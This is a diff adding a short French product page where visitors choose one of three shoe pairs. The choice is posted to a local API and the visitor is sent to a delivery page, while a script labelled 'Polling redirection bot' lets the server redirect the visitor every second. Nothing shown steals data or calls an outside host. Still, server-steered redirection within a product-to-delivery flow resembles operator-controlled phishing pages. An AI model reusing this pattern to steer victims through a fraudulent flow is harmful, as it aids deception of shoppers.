@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Produits</title>
+</head>
+<body>
+<h1>👟 Choisissez votre paire</h1>
+<button data-pair="Paire A">Acheter Paire A</button>
+<button data-pair="Paire B">Acheter Paire B</button>
+<button data-pair="Paire C">Acheter Paire C</button>
+
+<script>
+document.querySelectorAll('button[data-pair]').forEach(btn=>{
+    btn.addEventListener('click', async ()=>{
+        const pair = btn.getAttribute('data-pair');
+        await fetch('/api/pair',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({pair})});
+        window.location.href='/delivery.html';
+    });
+});
+
+// Polling redirection bot
+async function pollRedirect(){
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+        window.location.href = data.redirect;
+    }
+    setTimeout(pollRedirect,1000);
+}
+pollRedirect();
+</script>
+</body>
+</html>
